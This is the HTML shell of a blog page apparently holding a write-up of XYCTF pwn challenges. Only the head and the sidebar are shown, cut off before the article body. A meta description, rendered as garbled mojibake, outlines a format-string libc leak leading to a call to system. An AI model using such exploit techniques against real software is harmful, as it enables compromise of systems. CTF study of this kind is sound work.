<!doctype html>
<html lang="en-US" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.0" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.10" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://mister-hope.github.io/posts/pwn/competition/xyctf/xyctf.html"><meta property="og:site_name" content="Blog"><meta property="og:title" content="PWN"><meta property="og:description" content="PWN BabyGift image-20240422202855033 åˆ©ç”¨è¿™é‡Œä¼šè®©å­—ç¬¦ä¸²åœ°å€èµ‹å€¼ç»™rdi ç„¶åæˆ‘ä»¬é€šè¿‡åŠ«æŒç¨‹åºæµç¨‹è·‘åˆ°printfå¤„ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±èƒ½æ³„éœ²libcåœ°å€ ç„¶åè§¦å‘systemå‡½æ•°"><meta property="og:type" content="article"><meta property="og:locale" content="en-US"><meta property="og:updated_time" content="2024-05-06T02:39:03.000Z"><meta property="article:author" content="Elegy"><meta property="article:modified_time" content="2024-05-06T02:39:03.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"PWN","image":[""],"dateModified":"2024-05-06T02:39:03.000Z","author":[{"@type":"Person","name":"Elegy"}]}</script><title>PWN | Blog</title><meta name="description" content="PWN BabyGift image-20240422202855033 åˆ©ç”¨è¿™é‡Œä¼šè®©å­—ç¬¦ä¸²åœ°å€èµ‹å€¼ç»™rdi ç„¶åæˆ‘ä»¬é€šè¿‡åŠ«æŒç¨‹åºæµç¨‹è·‘åˆ°printfå¤„ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±èƒ½æ³„éœ²libcåœ°å€ ç„¶åè§¦å‘systemå‡½æ•°">
    <link rel="preload" href="/assets/style-I9UN-qkK.css" as="style"><link rel="stylesheet" href="/assets/style-I9UN-qkK.css">
    <link rel="modulepreload" href="/assets/app-lch0_zHc.js"><link rel="modulepreload" href="/assets/xyctf.html-U7JXxgQE.js"><link rel="modulepreload" href="/assets/xyctf.html-CcntUHLa.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-x3n3nnut.js">
    <link rel="prefetch" href="/assets/index.html-d64lF5z5.js" as="script"><link rel="prefetch" href="/assets/friendLink.html-zr_xV-0i.js" as="script"><link rel="prefetch" href="/assets/sycKernel.html-1dm3tgDo.js" as="script"><link rel="prefetch" href="/assets/readme_standards.html-pEVNdxIX.js" as="script"><link rel="prefetch" href="/assets/REALWORLD_android.html-ilINxQLE.js" as="script"><link rel="prefetch" href="/assets/base.html-ECKQmzL9.js" as="script"><link rel="prefetch" href="/assets/fridaåè°ƒè¯•.html-_6yV3zBe.js" as="script"><link rel="prefetch" href="/assets/objection.html-oYsjUDpx.js" as="script"><link rel="prefetch" href="/assets/xmlæ–‡ä»¶æ ¼å¼åˆ†æ.html-HCR8DFFP.js" as="script"><link rel="prefetch" href="/assets/algorithm_1.html-Tgzo2WQt.js" as="script"><link rel="prefetch" href="/assets/snake.html-llZtn7YL.js" as="script"><link rel="prefetch" href="/assets/å¹´åº¦æ€»ç»“-å‰¯æœ¬.html-KbIf2LkK.js" as="script"><link rel="prefetch" href="/assets/RSA.html-i3LWN_iw.js" as="script"><link rel="prefetch" href="/assets/db_study_1.html-hY-rcKqU.js" as="script"><link rel="prefetch" href="/assets/db_study_2.html-4M_NZzjW.js" as="script"><link rel="prefetch" href="/assets/goArchitecture.html-wH43_rkA.js" as="script"><link rel="prefetch" href="/assets/go_ass.html-gsvsmqr1.js" as="script"><link rel="prefetch" href="/assets/websocket.html-jgj4qoyh.js" as="script"><link rel="prefetch" href="/assets/build_specified_libc_docker.html-6leHLICp.js" as="script"><link rel="prefetch" href="/assets/git_standards.html-NHHv3Ez-.js" as="script"><link rel="prefetch" href="/assets/git_study.html-qpJp1DA0.js" as="script"><link rel="prefetch" href="/assets/asyncio.html-bNG7HEWb.js" as="script"><link rel="prefetch" href="/assets/c2018-HitCon-gundam(tcaheæœºåˆ¶_æ³„éœ²libcåœ°å€).html-ygG5hO5u.js" as="script"><link rel="prefetch" href="/assets/computeChunkSize.html-OabBS5TA.js" as="script"><link rel="prefetch" href="/assets/ez_chunk.html-bGTu0FU5.js" as="script"><link rel="prefetch" href="/assets/high_glibc_overlapping.html-x2iapavU.js" as="script"><link rel="prefetch" href="/assets/house_of_lore.html-e_lNhOgz.js" as="script"><link rel="prefetch" href="/assets/largeBinAttack.html-8I3fGqA1.js" as="script"><link rel="prefetch" href="/assets/studyHeap.html-k4lcrI12.js" as="script"><link rel="prefetch" href="/assets/studyHeapVedio.html-g78EyZnE.js" as="script"><link rel="prefetch" href="/assets/studyHeapVedio2.html-2umXXczC.js" as="script"><link rel="prefetch" href="/assets/thread_pwn.html-nvOQzQ5y.js" as="script"><link rel="prefetch" href="/assets/unsortedBinLeakLibc.html-XH7fxtfm.js" as="script"><link rel="prefetch" href="/assets/vctf_leak_libc.html-oaheUN0Z.js" as="script"><link rel="prefetch" href="/assets/xyctf_heap_pro.html-ZMtPwtuh.js" as="script"><link rel="prefetch" href="/assets/house_of_apple.html-PqYQUqHo.js" as="script"><link rel="prefetch" href="/assets/house_of_apple2.html-4ULQEKDx.js" as="script"><link rel="prefetch" href="/assets/io_file.html-Uim73Lpe.js" as="script"><link rel="prefetch" href="/assets/io_file_study2.html-BSDbfpSO.js" as="script"><link rel="prefetch" href="/assets/linux_kernel1.html-m4SZ1cIO.js" as="script"><link rel="prefetch" href="/assets/linux_kernel2.html-k2tlWpg-.js" as="script"><link rel="prefetch" href="/assets/socket.html-p7GxAPCV.js" as="script"><link rel="prefetch" href="/assets/php.html-yKr5yWYy.js" as="script"><link rel="prefetch" href="/assets/8byte(æ ˆè¿ç§»).html-DI-O40Yh.js" as="script"><link rel="prefetch" href="/assets/one_byte_rop.html-WnXEfBPa.js" as="script"><link rel="prefetch" href="/assets/ret2dl.html-tO1F6hlv.js" as="script"><link rel="prefetch" href="/assets/IOåç§».html-ST5jP4eS.js" as="script"><link rel="prefetch" href="/assets/usePatchelf.html-d4-oWJvX.js" as="script"><link rel="prefetch" href="/assets/babyre.html-5Mnk2RGn.js" as="script"><link rel="prefetch" href="/assets/nc(file).html-FOCg92VM.js" as="script"><link rel="prefetch" href="/assets/siscn_pwn1(æ ˆè¿ç§»_floatæ•°æ®æ ¼å¼).html-T8XbMrXX.js" as="script"><link rel="prefetch" href="/assets/404.html-GbdKBWVO.js" as="script"><link rel="prefetch" href="/assets/index.html-hSZUPkrO.js" as="script"><link rel="prefetch" href="/assets/index.html-pNGu0lUA.js" as="script"><link rel="prefetch" href="/assets/index.html-Xj4Q9xIB.js" as="script"><link rel="prefetch" href="/assets/index.html-tMDxqIZM.js" as="script"><link rel="prefetch" href="/assets/index.html-PuHu6YHX.js" as="script"><link rel="prefetch" href="/assets/index.html-tLPcYGIY.js" as="script"><link rel="prefetch" href="/assets/index.html-4NfTkLWT.js" as="script"><link rel="prefetch" href="/assets/index.html-4cD2voHP.js" as="script"><link rel="prefetch" href="/assets/index.html-24FdbV0X.js" as="script"><link rel="prefetch" href="/assets/index.html-czMqdCgc.js" as="script"><link rel="prefetch" href="/assets/index.html-fSO7t_lT.js" as="script"><link rel="prefetch" href="/assets/index.html-iZBUR2OT.js" as="script"><link rel="prefetch" href="/assets/index.html-l5-YUSgT.js" as="script"><link rel="prefetch" href="/assets/index.html-LNcUfwr4.js" as="script"><link rel="prefetch" href="/assets/index.html-nEruGExL.js" as="script"><link rel="prefetch" href="/assets/index.html-9Aqdve0Y.js" as="script"><link rel="prefetch" href="/assets/index.html-WKQ9YVKS.js" as="script"><link rel="prefetch" href="/assets/index.html-tzE_FC09.js" as="script"><link rel="prefetch" href="/assets/index.html-6QmsITJo.js" as="script"><link rel="prefetch" href="/assets/index.html-ecknHaKX.js" as="script"><link rel="prefetch" href="/assets/index.html-dr1vm6Y5.js" as="script"><link rel="prefetch" href="/assets/index.html-oZ7OrbtP.js" as="script"><link rel="prefetch" href="/assets/index.html-uoti10BU.js" as="script"><link rel="prefetch" href="/assets/index.html-h74VB_iX.js" as="script"><link rel="prefetch" href="/assets/index.html-FX0FUsyi.js" as="script"><link rel="prefetch" href="/assets/index.html-5ejjnIEC.js" as="script"><link rel="prefetch" href="/assets/index.html-OOIKiO_Q.js" as="script"><link rel="prefetch" href="/assets/index.html-mjDNWrju.js" as="script"><link rel="prefetch" href="/assets/index.html-T1yxd-4C.js" as="script"><link rel="prefetch" href="/assets/index.html-vmnwGQ_x.js" as="script"><link rel="prefetch" href="/assets/index.html-kQVPBo8D.js" as="script"><link rel="prefetch" href="/assets/index.html-OJk1c0ek.js" as="script"><link rel="prefetch" href="/assets/index.html-5kdxgiAV.js" as="script"><link rel="prefetch" href="/assets/index.html-kYz9mkQs.js" as="script"><link rel="prefetch" href="/assets/index.html-T0M1RHdG.js" as="script"><link rel="prefetch" href="/assets/index.html-kZKZ9YNl.js" as="script"><link rel="prefetch" href="/assets/index.html-ToVv3Ha4.js" as="script"><link rel="prefetch" href="/assets/index.html-AIEp5aPZ.js" as="script"><link rel="prefetch" href="/assets/index.html-OjELZcvu.js" as="script"><link rel="prefetch" href="/assets/index.html-eNdUahdf.js" as="script"><link rel="prefetch" href="/assets/index.html-tf1pjMmD.js" as="script"><link rel="prefetch" href="/assets/index.html-5qmzGUj6.js" as="script"><link rel="prefetch" href="/assets/index.html-G-06IUJG.js" as="script"><link rel="prefetch" href="/assets/index.html-RbJyN7x6.js" as="script"><link rel="prefetch" href="/assets/index.html-wkxvpnTw.js" as="script"><link rel="prefetch" href="/assets/index.html-2qwayshd.js" as="script"><link rel="prefetch" href="/assets/index.html-Ix21QJuL.js" as="script"><link rel="prefetch" href="/assets/index.html-QJFi238y.js" as="script"><link rel="prefetch" href="/assets/index.html-wOO6TPmu.js" as="script"><link rel="prefetch" href="/assets/index.html-IRzW8Ehl.js" as="script"><link rel="prefetch" href="/assets/index.html-YZMti94B.js" as="script"><link rel="prefetch" href="/assets/index.html-2oe05wH4.js" as="script"><link rel="prefetch" href="/assets/index.html-tkJfiFUZ.js" as="script"><link rel="prefetch" href="/assets/index.html-c-XZEzeF.js" as="script"><link rel="prefetch" href="/assets/index.html-e9cfnpw9.js" as="script"><link rel="prefetch" href="/assets/index.html-Zjg8o3Ta.js" as="script"><link rel="prefetch" href="/assets/friendLink.html-__iO0YEQ.js" as="script"><link rel="prefetch" href="/assets/sycKernel.html-UYD27PMt.js" as="script"><link rel="prefetch" href="/assets/readme_standards.html-hHX_N1Y8.js" as="script"><link rel="prefetch" href="/assets/REALWORLD_android.html-zfIbI5Fs.js" as="script"><link rel="prefetch" href="/assets/base.html-2Iovpng9.js" as="script"><link rel="prefetch" href="/assets/fridaåè°ƒè¯•.html-v0lBl1ET.js" as="script"><link rel="prefetch" href="/assets/objection.html-nztuka_C.js" as="script"><link rel="prefetch" href="/assets/xmlæ–‡ä»¶æ ¼å¼åˆ†æ.html-atGT1PpB.js" as="script"><link rel="prefetch" href="/assets/algorithm_1.html-WepU44cK.js" as="script"><link rel="prefetch" href="/assets/snake.html-aAKb3Jt_.js" as="script"><link rel="prefetch" href="/assets/å¹´åº¦æ€»ç»“-å‰¯æœ¬.html-UC4jND65.js" as="script"><link rel="prefetch" href="/assets/RSA.html-qKgrZmqJ.js" as="script"><link rel="prefetch" href="/assets/db_study_1.html-VcwdY0aH.js" as="script"><link rel="prefetch" href="/assets/db_study_2.html-UkECPNF1.js" as="script"><link rel="prefetch" href="/assets/goArchitecture.html-Z22w7kre.js" as="script"><link rel="prefetch" href="/assets/go_ass.html-mvihAN5T.js" as="script"><link rel="prefetch" href="/assets/websocket.html-vgtKeY3r.js" as="script"><link rel="prefetch" href="/assets/build_specified_libc_docker.html-5MgbZvUu.js" as="script"><link rel="prefetch" href="/assets/git_standards.html-4IiG5fuC.js" as="script"><link rel="prefetch" href="/assets/git_study.html-6Kg2i1X2.js" as="script"><link rel="prefetch" href="/assets/asyncio.html-tpl6JRtv.js" as="script"><link rel="prefetch" href="/assets/c2018-HitCon-gundam(tcaheæœºåˆ¶_æ³„éœ²libcåœ°å€).html--tTBdraG.js" as="script"><link rel="prefetch" href="/assets/computeChunkSize.html-bJGLdtqO.js" as="script"><link rel="prefetch" href="/assets/ez_chunk.html-eTV0ADHd.js" as="script"><link rel="prefetch" href="/assets/high_glibc_overlapping.html-Wtu09ofD.js" as="script"><link rel="prefetch" href="/assets/house_of_lore.html-L98celWN.js" as="script"><link rel="prefetch" href="/assets/largeBinAttack.html-FKYFmLF8.js" as="script"><link rel="prefetch" href="/assets/studyHeap.html-HDZBZK-V.js" as="script"><link rel="prefetch" href="/assets/studyHeapVedio.html-Mtbr7wFR.js" as="script"><link rel="prefetch" href="/assets/studyHeapVedio2.html-9iwn2eLN.js" as="script"><link rel="prefetch" href="/assets/thread_pwn.html-K7gah4gD.js" as="script"><link rel="prefetch" href="/assets/unsortedBinLeakLibc.html-F0aoZ5Ra.js" as="script"><link rel="prefetch" href="/assets/vctf_leak_libc.html-43Q_guvc.js" as="script"><link rel="prefetch" href="/assets/xyctf_heap_pro.html-_LcDXsia.js" as="script"><link rel="prefetch" href="/assets/house_of_apple.html-t0_1gvqY.js" as="script"><link rel="prefetch" href="/assets/house_of_apple2.html-6hGh1wMy.js" as="script"><link rel="prefetch" href="/assets/io_file.html-zzHS6Od7.js" as="script"><link rel="prefetch" href="/assets/io_file_study2.html-Dj0fL9Iw.js" as="script"><link rel="prefetch" href="/assets/linux_kernel1.html-l7TX8LB6.js" as="script"><link rel="prefetch" href="/assets/linux_kernel2.html-NueNzu5B.js" as="script"><link rel="prefetch" href="/assets/socket.html-ScRcl4uR.js" as="script"><link rel="prefetch" href="/assets/php.html-VvZ4nZnQ.js" as="script"><link rel="prefetch" href="/assets/8byte(æ ˆè¿ç§»).html-58OAl2-O.js" as="script"><link rel="prefetch" href="/assets/one_byte_rop.html-oiIk1yt0.js" as="script"><link rel="prefetch" href="/assets/ret2dl.html-unMccsqg.js" as="script"><link rel="prefetch" href="/assets/IOåç§».html-S7XBao6M.js" as="script"><link rel="prefetch" href="/assets/usePatchelf.html-pjZGZOZY.js" as="script"><link rel="prefetch" href="/assets/babyre.html-1HRYUyP4.js" as="script"><link rel="prefetch" href="/assets/nc(file).html-RngOURB-.js" as="script"><link rel="prefetch" href="/assets/siscn_pwn1(æ ˆè¿ç§»_floatæ•°æ®æ ¼å¼).html-chEdClTN.js" as="script"><link rel="prefetch" href="/assets/404.html-BuI5n8el.js" as="script"><link rel="prefetch" href="/assets/index.html-pETNGoxQ.js" as="script"><link rel="prefetch" href="/assets/index.html-roXBZu7K.js" as="script"><link rel="prefetch" href="/assets/index.html-UFGmDWfg.js" as="script"><link rel="prefetch" href="/assets/index.html-JZ4DTHxE.js" as="script"><link rel="prefetch" href="/assets/index.html-JIBbm-G5.js" as="script"><link rel="prefetch" href="/assets/index.html-WphqKEVs.js" as="script"><link rel="prefetch" href="/assets/index.html-s0jQH54l.js" as="script"><link rel="prefetch" href="/assets/index.html-1Jr25dvJ.js" as="script"><link rel="prefetch" href="/assets/index.html-_SIAZyUX.js" as="script"><link rel="prefetch" href="/assets/index.html-sq3bvwfT.js" as="script"><link rel="prefetch" href="/assets/index.html-q1BHQIcx.js" as="script"><link rel="prefetch" href="/assets/index.html-ebdgqoPs.js" as="script"><link rel="prefetch" href="/assets/index.html--CoCcClY.js" as="script"><link rel="prefetch" href="/assets/index.html-IgZSldh_.js" as="script"><link rel="prefetch" href="/assets/index.html-VuDpfWgm.js" as="script"><link rel="prefetch" href="/assets/index.html-kciSEvRN.js" as="script"><link rel="prefetch" href="/assets/index.html-n9b39Jmd.js" as="script"><link rel="prefetch" href="/assets/index.html-6tMKxyxH.js" as="script"><link rel="prefetch" href="/assets/index.html-ZFA82RMR.js" as="script"><link rel="prefetch" href="/assets/index.html-W2KMnU_6.js" as="script"><link rel="prefetch" href="/assets/index.html-KFOMT-SP.js" as="script"><link rel="prefetch" href="/assets/index.html-s518866L.js" as="script"><link rel="prefetch" href="/assets/index.html-oQ8KUMMQ.js" as="script"><link rel="prefetch" href="/assets/index.html-PqoG57Ko.js" as="script"><link rel="prefetch" href="/assets/index.html-pxtqA_6Q.js" as="script"><link rel="prefetch" href="/assets/index.html-EP62EKNX.js" as="script"><link rel="prefetch" href="/assets/index.html-W6KxbT_v.js" as="script"><link rel="prefetch" href="/assets/index.html-_EdzKQx6.js" as="script"><link rel="prefetch" href="/assets/index.html-xdsxzPHU.js" as="script"><link rel="prefetch" href="/assets/index.html-hM2J_vqL.js" as="script"><link rel="prefetch" href="/assets/index.html-bvb62QeS.js" as="script"><link rel="prefetch" href="/assets/index.html-WZgvlH8R.js" as="script"><link rel="prefetch" href="/assets/index.html-eLqBmQY5.js" as="script"><link rel="prefetch" href="/assets/index.html-ZNyH6mYm.js" as="script"><link rel="prefetch" href="/assets/index.html-yNkYqBIX.js" as="script"><link rel="prefetch" href="/assets/index.html-k8zZGzEZ.js" as="script"><link rel="prefetch" href="/assets/index.html-ewUFuWc-.js" as="script"><link rel="prefetch" href="/assets/index.html-q-Tt-5gH.js" as="script"><link rel="prefetch" href="/assets/index.html-J4ABW5_9.js" as="script"><link rel="prefetch" href="/assets/index.html-kkpQZguS.js" as="script"><link rel="prefetch" href="/assets/index.html-tw1M8C5L.js" as="script"><link rel="prefetch" href="/assets/index.html-BOoEU1Jc.js" as="script"><link rel="prefetch" href="/assets/index.html-i7mD88KK.js" as="script"><link rel="prefetch" href="/assets/index.html-qKj3h0HO.js" as="script"><link rel="prefetch" href="/assets/index.html-jTicm8dQ.js" as="script"><link rel="prefetch" href="/assets/index.html-mr5bAdtM.js" as="script"><link rel="prefetch" href="/assets/index.html-ZxV5kgT_.js" as="script"><link rel="prefetch" href="/assets/index.html-d_UIu5S1.js" as="script"><link rel="prefetch" href="/assets/index.html-2LZ_cBhz.js" as="script"><link rel="prefetch" href="/assets/index.html-zBnIarkc.js" as="script"><link rel="prefetch" href="/assets/index.html-lBzX7hAD.js" as="script"><link rel="prefetch" href="/assets/index.html-8SUHQY2j.js" as="script"><link rel="prefetch" href="/assets/index.html-JUAsOjNZ.js" as="script"><link rel="prefetch" href="/assets/index.html-BD1xp8IW.js" as="script"><link rel="prefetch" href="/assets/index.html-RxA2hRcI.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-08_zHRDQ.js" as="script"><link rel="prefetch" href="/assets/SearchResult-FlSdkUda.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">Skip to main content</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="vp-link vp-brand vp-brand" href="/"><img class="vp-nav-logo" src="https://awaqwqa.github.io/çŸ³å¤´é—¨.jpg" aria-hidden><!----><span class="vp-site-name hide-in-pad">Blog</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="nav-item hide-in-mobile"><a aria-label="Blog Home" class="vp-link nav-link nav-link" href="/"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>Blog Home<!----></a></div><div class="nav-item hide-in-mobile"><a aria-label="æ–‡ç« " class="vp-link nav-link active nav-link active" href="/posts/"><span class="font-icon icon fa-fw fa-sm fas fa-article" style=""></span>æ–‡ç« <!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="nav-item vp-repo"><a class="vp-repo-link" href="https://github.com/vuepress-theme-hope/vuepress-theme-hope" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!--[--><button type="button" class="search-pro-button" aria-label="Search"><svg xmlns="http://www.w3.org/2000/svg" class="icon search-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="search icon"><path d="M192 480a256 256 0 1 1 512 0 256 256 0 0 1-512 0m631.776 362.496-143.2-143.168A318.464 318.464 0 0 0 768 480c0-176.736-143.264-320-320-320S128 303.264 128 480s143.264 320 320 320a318.016 318.016 0 0 0 184.16-58.592l146.336 146.368c12.512 12.48 32.768 12.48 45.28 0 12.48-12.512 12.48-32.768 0-45.28"></path></svg><div class="search-pro-placeholder">Search</div><div class="search-pro-key-hints"><kbd class="search-pro-key">Ctrl</kbd><kbd class="search-pro-key">K</kbd></div></button><!--]--><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Android</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Development</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable active" type="button"><!----><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable active" type="button"><!----><span class="vp-sidebar-title">Competition</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable" type="button"><!----><span class="vp-sidebar-title">Nssctf</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-heading clickable active" type="button"><!----><span class="vp-sidebar-title">Xyctf</span><span class="vp-arrow down"></span></button><ul class="vp-sidebar-links"><li><!--[--><a aria-label="PWN" class="vp-link nav-link active vp-sidebar-link vp-sidebar-page active nav-link active vp-sidebar-link vp-sidebar-page active" href="/posts/pwn/competition/xyctf/xyctf.html"><!---->PWN<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="BabyGift" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#babygift"><!---->BabyGift<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="fastfastfast" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#fastfastfast"><!---->fastfastfast<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="è„šæœ¬" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#è„šæœ¬"><!---->è„šæœ¬<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-label="fmt" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#fmt"><!---->fmt<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-label="exit hookåœ°å€å†™å…¥æ ˆ:" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#exit-hookåœ°å€å†™å…¥æ ˆ"><!---->exit hookåœ°å€å†™å…¥æ ˆ:<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="é€‰æ‹©" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#é€‰æ‹©"><!---->é€‰æ‹©<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="è„šæœ¬" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#è„šæœ¬-1"><!---->è„šæœ¬<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-label="GuestBook" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#guestbook"><!---->GuestBook<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="hello_world" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#hello-world"><!---->hello_world<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="Intermittent" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#intermittent"><!---->Intermittent<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-label="inviisible_flag" class="vp-link nav-link vp-sidebar-link vp-heading nav-link vp-sidebar-link vp-heading" href="/posts/pwn/competition/xyctf/xyctf.html#inviisible-flag"><!---->inviisible_flag<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a 